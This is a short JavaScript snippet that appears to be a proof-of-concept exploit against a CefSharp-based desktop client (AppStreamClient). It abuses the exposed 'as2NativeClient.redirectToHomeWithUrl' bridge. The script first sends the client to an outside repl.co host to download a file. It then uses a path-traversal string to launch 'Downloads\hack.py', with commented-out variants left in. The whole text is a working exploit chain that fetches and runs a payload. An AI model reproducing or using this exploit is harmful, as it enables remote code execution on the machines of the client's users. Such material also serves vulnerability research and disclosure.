
        window.CefSharp.BindObjectAsync("as2NativeClient")
        .then((result) => {
          if(window.as2NativeClient) {
                  
            if (window.location.hash!="download_completed")
            {
                   window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/");
                   window.location.hash="download_completed"
                   window.location.reload()
            }
                 else{
                         window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")   
                 
                 }

                  // C:\Users\rakesh\AppData\Local\AppStreamClient\app-1.1.160>dir .\..\..\..\..\Downloads
           
            //setTimeout('window.as2NativeClient.redirectToHomeWithUrl(".\..\..\..\..\Downloads\hack.py")',2000)      
            

            //window.as2NativeClient.redirectToHomeWithUrl("hack.py")
             
                  
         }
        })

